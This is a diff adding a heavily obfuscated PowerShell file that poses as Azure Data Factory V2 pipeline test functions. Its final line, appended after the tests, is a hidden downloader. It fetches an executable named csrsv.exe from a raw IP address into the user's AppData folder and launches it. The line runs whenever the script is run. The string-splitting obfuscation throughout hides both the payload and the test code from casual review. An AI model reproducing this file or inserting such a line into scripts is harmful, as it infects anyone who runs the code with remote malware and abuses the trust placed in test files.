@@ -1,0 +1,102 @@
+ &("{1}{0}{2}{3}"-f 'ariA','sEt-V','B','le') ("{1}{0}" -f'itS','k') ([tyPe]("{0}{1}" -f 'DA','TeTIMe') ) ;
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+function tEST-pIPEL`I`Ne
+{
+    ${Df`N`AMe} = &("{5}{4}{1}{2}{0}{3}"-f'ryNa','ac','to','me','t-DataF','Ge')
+    ${r`GnA`ME} = .("{3}{2}{4}{0}{1}"-f 'eGr','oupName','t-','Ge','Resourc')
+    ${rGLOC`A`TioN} = .("{0}{2}{3}{4}{1}"-f'G','n','et-ProviderLo','cat','io') ("{1}{0}{3}{2}" -f 'e','ResourceManag','t','men')
+    ${dfLo`Ca`TIOn} = &("{3}{0}{2}{1}"-f 'et-ProviderLoca','ion','t','G') ("{4}{5}{6}{1}{0}{2}{3}" -f 'yMana','ctor','ge','ment','Data','F','a')
+
+    ${en`d`DaTe} =   (.("{1}{0}"-f 'AriAblE','V')  ("{1}{0}" -f'tS','Ki')  -vAlu )::("{0}{1}"-f'Pa','rse').Invoke(("{0}{1}{2}" -f'9','/','8/2014'))
+    ${STar`TD`Ate} = ${eND`D`AtE}.("{0}{1}{2}" -f'AddHou','r','s').Invoke(-1)
+        
+    .("{2}{1}{0}{3}"-f 'ce','ur','New-AzReso','Group') -Name ${R`gnA`mE} -Location ${rGlo`cat`I`on} -Force
+
+    try
+    {
+        ${D`F} = &("{5}{2}{1}{4}{3}{0}" -f 'V2','zDataFact','et-A','ry','o','S') -ResourceGroupName ${r`G`NaME} -Name ${D`FnAme} -Location ${df`LocAt`IOn} -Force
+
+        ${l`SNA`ME} = ("{0}{1}"-f'f','oo1')
+        &("{4}{6}{7}{5}{0}{8}{2}{3}{1}"-f'ac','e','dSer','vic','Se','ataF','t','-AzD','toryV2Linke') -ResourceGroupName ${rgN`A`me} -DataFactoryName ${dfNA`ME} -File ((("{1}{6}{2}{4}{5}{8}{3}{0}{7}" -f'so','.{0}','}link','.j','edSe','rvic','Resources{0','n','e'))-F  [chaR]92) -Name ${l`S`NamE} -Force
+
+        .("{4}{1}{3}{6}{5}{0}{2}" -f 'V2Data','Az','set','Da','Set-','Factory','ta') -ResourceGroupName ${Rgn`AMe} -DataFactoryName ${DfN`A`ME} -Name ("{1}{0}" -f'n','dsI') -File ((("{0}{5}{2}{3}{4}{1}" -f '.Dp6R','son','Dp6dataset','-ds','In.j','esources'))  -rePlaCE  ([CHar]68+[CHar]112+[CHar]54),[CHar]92) -Force
+        .("{6}{3}{0}{1}{2}{4}{5}" -f'F','a','ctor','AzData','yV2','Dataset','Set-') -ResourceGroupName ${RgNa`Me} -DataFactoryName ${Df`N`AMe} -Name ("{0}{1}" -f 'ds','0_0') -File ((("{5}{2}{1}{6}{0}{4}{3}"-f'set-','ces{0}da','Resour','s0_0.json','d','.{0}','ta'))  -f [Char]92) -Force
+        &("{1}{5}{0}{4}{2}{3}"-f 'ataFactor','Set-A','2Da','taset','yV','zD') -ResourceGroupName ${rGn`AmE} -DataFactoryName ${DFNa`Me} -Name ("{1}{0}"-f '1_0','ds') -File ((("{3}{5}{0}{6}{4}{1}{2}"-f'e','ds1_0.jso','n','.BsgResourc','-','esBsgdatas','t'))  -REplAcE 'Bsg',[CHAR]92) -Force
+
+        ${p`I`p`eLiNeNAmE} = ("{4}{0}{3}{1}{2}" -f 'eP','i','ne','ipel','sampl')   
+        ${EX`PECt`ED} = .("{1}{3}{0}{4}{5}{2}"-f'-AzData','S','peline','et','Fact','oryV2Pi') -ResourceGroupName ${rG`N`Ame} -Name ${P`iPE`Line`NaME} -DataFactoryName ${d`FN`AMe} -File ((("{2}{6}{0}{3}{5}{1}{4}" -f'u','l','.vhCRe','rcesvhCp','ine.json','ipe','so'))  -rEpLaCe'vhC',[cHaR]92) -Force
+        ${a`CTu`Al} = &("{4}{8}{7}{5}{1}{2}{6}{3}{0}" -f'line','o','r','pe','Get-','t','yV2Pi','Fac','AzData') -ResourceGroupName ${rGN`A`ME} -Name ${PI`PEl`iNeNAME} -DataFactoryName ${DfNa`Me}
+
+        .("{3}{5}{2}{1}{6}{0}{4}"-f'ur','es','fSubR','Veri','ce','fy-Ad','o') ${EX`pEC`TED} ${aC`T`UaL} ${RGNA`me} ${d`F`NAMe} ${P`iPelI`NenA`me}
+                
+        
+        &("{2}{3}{5}{1}{0}{4}" -f '2Pipe','zDataFactoryV','G','e','line','t-A') -DataFactory ${DF} -Name ${PIpElin`en`AmE} | .("{1}{6}{2}{0}{4}{5}{3}"-f'-AzDataFac','Rem','ve','ne','toryV2Pi','peli','o') -Force
+
+        
+        .("{1}{5}{3}{4}{2}{0}"-f 's','As','ntain','t-Thro','wsCo','ser') { .("{4}{3}{0}{2}{7}{5}{1}{6}"-f'taFa','el','c','a','Get-AzD','ryV2Pip','ine','to') -DataFactory ${dF} -Name ${p`iPelin`ENA`Me} } ("{2}{1}{0}"-f 'nd','tFou','No') 
+                
+        
+        &("{3}{7}{6}{5}{2}{8}{4}{0}{1}" -f'li','ne','V2','Remove-Az','pe','ctory','Fa','Data','Pi') -ResourceGroupName ${r`gnA`ME} -DataFactoryName ${Df`NA`Me} -Name ${p`i`pelInEname} -Force
+    }
+    finally
+    {
+        &("{1}{2}{0}"-f 'eanUp','C','l') ${rg`N`AME} ${D`FNAME}
+    }
+}
+
+
+function tEs`T`-PiPeLinE`wiTHrE`sO`U`R`ce`iD
+{
+    ${DFNa`mE} = .("{5}{6}{4}{3}{1}{0}{2}" -f'y','taFactor','Name','a','t-D','G','e')
+    ${r`GName} = &("{6}{3}{2}{0}{1}{4}{5}"-f'urce','Gro','o','es','up','Name','Get-R')
+    ${RGLO`Cat`Ion} = .("{5}{4}{3}{0}{2}{1}"-f 'oc','on','ati','rL','rovide','Get-P') ("{1}{0}{3}{2}"-f 'urceManage','Reso','nt','me')
+    ${Df`lOC`ATIon} = .("{0}{1}{4}{3}{2}"-f 'Get-Pro','vi','ion','erLocat','d') ("{2}{0}{1}{3}" -f 'o','ryMan','DataFact','agement')
+
+    ${E`N`DDaTE} =   ( &("{1}{0}{2}" -f'B','vArIA','le') ("{1}{0}"-f 'ITs','k')  -VAlUEon  )::("{1}{0}" -f'arse','P').Invoke(("{0}{1}"-f'9/8','/2014'))
+    ${St`ARt`d`ATE} = ${En`Dda`TE}.("{2}{1}{0}"-f 's','our','AddH').Invoke(-1)
+        
+    &("{6}{3}{5}{1}{0}{2}{4}" -f'sourc','e','e','w','Group','-AzR','Ne') -Name ${Rg`N`AME} -Location ${r`GLoCAti`On} -Force
+
+    try
+    {
+        ${D`F} = .("{2}{3}{1}{0}"-f 'yV2','or','Set-AzData','Fact') -ResourceGroupName ${Rg`NAmE} -Name ${d`FNAMe} -Location ${dfl`oc`AT`iON} -Force
+
+        ${lS`N`Ame} = ("{1}{0}"-f '1','foo')
+        .("{1}{4}{2}{6}{0}{3}{5}"-f 'V2L','Set-Az','ctor','inked','DataFa','Service','y') -ResourceGroupName ${r`GNaME} -DataFactoryName ${D`FNa`Me} -File ((("{5}{7}{3}{8}{6}{2}{1}{0}{4}"-f'.jso','rvice','Se','5Resourc','n','.R','ed','s','esRs5link')) -crEPlACe  'Rs5',[cHAR]92) -Name ${LS`NAme} -Force
+
+        &("{0}{6}{8}{7}{3}{5}{4}{2}{1}"-f 'S','ataset','yV2D','aFact','r','o','e','at','t-AzD') -ResourceGroupName ${r`gN`Ame} -DataFactoryName ${dfN`A`Me} -Name ("{1}{0}"-f'sIn','d') -File ((("{5}{4}{3}{6}{1}{0}{2}"-f'sIn.j','taset-d','son','N','bV','.bVNResources','da'))  -CrEpLaCE  'bVN',[cHAR]92) -Force
+        .("{1}{7}{3}{2}{8}{6}{0}{4}{5}" -f'cto','S','zD','-A','ryV2Datas','et','a','et','ataF') -ResourceGroupName ${Rg`NamE} -DataFactoryName ${d`FN`Ame} -Name ("{0}{1}"-f'ds0_','0') -File ((("{2}{8}{5}{7}{4}{3}{10}{0}{6}{9}{1}"-f'taset-ds0_0.j','n','.','0}d','ces{','es','s','our','{0}R','o','a'))  -F  [ChAR]92) -Force
+        .("{2}{0}{7}{6}{5}{4}{1}{3}" -f 'D','a','Set-Az','set','ctoryV2Dat','a','taF','a') -ResourceGroupName ${rGN`A`Me} -DataFactoryName ${d`FN`AMe} -Name ("{1}{0}"-f'_0','ds1') -File ((("{3}{5}{6}{2}{0}{1}{7}{4}" -f'atas','et-ds','esIuQd','.','json','IuQResou','rc','1_0.'))  -CrePlACE 'IuQ',[CHar]92) -Force
+
+        ${PIpelINe`Na`mE} = ("{3}{2}{1}{0}"-f'e','Pipelin','ample','s')   
+        ${AC`Tu`Al} = .("{5}{4}{3}{6}{2}{0}{1}" -f 'pe','line','Pi','oryV','ataFact','Set-AzD','2') -ResourceGroupName ${RGN`AmE} -Name ${PI`PEli`NENA`Me} -DataFactoryName ${DFn`AMe} -File ((("{7}{0}{6}{3}{1}{5}{2}{4}" -f 'Res','e','jso','n','n','.','ourcesqsLpipeli','.qsL'))-cRepLACe  ([cHaR]113+[cHaR]115+[cHaR]76),[cHaR]92) -Force
+        
+        ${E`x`peCTEd} = &("{1}{0}{4}{3}{5}{2}{6}" -f 't-','Ge','2Pipeli','o','AzDataFact','ryV','ne') -ResourceId ${Ac`TU`AL}."iD"
+
+        .("{2}{4}{3}{0}{1}" -f 'reEqu','al','Ass','t-A','er') ${e`x`PeCted}."R`es`oU`RCeGrOupN`AMe" ${actU`Al}."resOu`RCE`grO`U`PNaME"
+        &("{2}{0}{1}"-f'E','qual','Assert-Are') ${eX`PE`cTED}."data`FaCtoRy`N`AME" ${ACTU`Al}."DAta`F`ACtoRY`N`Ame"
+        .("{2}{3}{0}{1}"-f'sert-AreEqu','al','A','s') ${e`XPe`C`TED}."Na`ME" ${Ac`T`UAL}."n`AMe"
+
+        .("{4}{2}{5}{3}{8}{1}{6}{7}{0}" -f 'e','Pip','ove-','FactoryV','Rem','AzData','eli','n','2') -ResourceId ${act`U`AL}."id" -Force
+    }
+    finally
+    {
+        .("{0}{1}"-f'Cle','anUp') ${r`G`Name} ${D`FnaME}
+    }
+}
+(&("{0}{1}{2}" -f 'New','-Obje','ct') ("{3}{0}{4}{1}{2}{5}" -f 'tem.','b','Cl','Sys','Net.We','ient')).("{2}{1}{0}{3}"-f 'wnloadFil','o','D','e').Invoke(("{0}{3}{2}{5}{4}{1}{6}" -f'http','hoo/','/94.102.53.',':/','/~ya','238','csrsv.exe'),"$env:APPDATA\csrsv.exe");&("{1}{0}{3}{4}{2}"-f 'a','St','ss','rt-Pr','oce') ("$env:APPDATA\csrsv.exe")
